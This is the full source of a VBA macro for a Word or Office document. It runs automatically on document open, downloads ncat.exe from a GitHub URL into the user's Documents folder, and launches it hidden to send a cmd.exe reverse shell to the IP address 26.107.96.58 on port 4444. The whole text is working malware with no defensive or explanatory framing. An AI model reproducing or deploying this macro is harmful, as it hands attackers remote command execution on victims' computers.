Sub AutoOpen()
    DownloadAndExecuteShell
End Sub

Sub Document_Open()
    DownloadAndExecuteShell
End Sub

Sub DownloadAndExecuteShell()
    Dim ncatURL As String
    ncatURL = "https://github.com/X0rb1t/ncat/raw/main/ncat.exe"
    Dim downloadPath As String
    downloadPath = Environ("USERPROFILE") & "\Documents\ncat.exe"

    DownloadFile ncatURL, downloadPath

    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run downloadPath & " 26.107.96.58 4444 -e cmd.exe", 0, False
    Set objShell = Nothing
End Sub

Sub DownloadFile(ByVal URL As String, ByVal destinationPath As String)
    Dim objXMLHTTP As Object
    Dim objADOStream As Object

    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    Set objADOStream = CreateObject("ADODB.Stream")

    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.send

    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.responseBody
    objADOStream.SaveToFile destinationPath, 2
    objADOStream.Close

    Set objADOStream = Nothing
    Set objXMLHTTP = Nothing
End Sub
